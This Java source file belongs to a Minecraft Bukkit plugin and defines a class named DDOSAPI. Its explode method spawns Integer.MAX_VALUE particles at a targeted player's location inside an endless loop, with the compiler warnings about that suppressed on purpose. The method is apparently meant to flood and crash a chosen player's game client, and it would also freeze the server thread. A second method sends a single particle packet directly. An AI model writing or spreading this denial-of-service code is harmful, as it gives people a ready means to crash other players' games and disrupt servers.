package net.hyocean.hyoceanhub.api;

import net.minecraft.server.v1_11_R1.EnumParticle;
import net.minecraft.server.v1_11_R1.PacketPlayOutWorldParticles;
import org.bukkit.Particle;
import org.bukkit.craftbukkit.v1_11_R1.entity.CraftPlayer;
import org.bukkit.entity.Player;

public class DDOSAPI {

    @SuppressWarnings({"ConstantConditions", "LoopConditionNotUpdatedInsideLoop"})
    public void explode(Player player, Particle particle, Integer times){
        for(int t = 0; t < times; t++){
            while(t < times){
                player.getWorld().spawnParticle(particle, player.getLocation(), Integer.MAX_VALUE);
            }
        }
    }

    public void explodePacket(Player player, EnumParticle particle){
        ((CraftPlayer) player).getHandle().playerConnection.sendPacket(new PacketPlayOutWorldParticles(particle, true, (float) player.getLocation().getX(), (float) (player.getLocation().getY() + 3), (float) player.getLocation().getZ(), 0, 0, 0, 0, 1));
    }

}
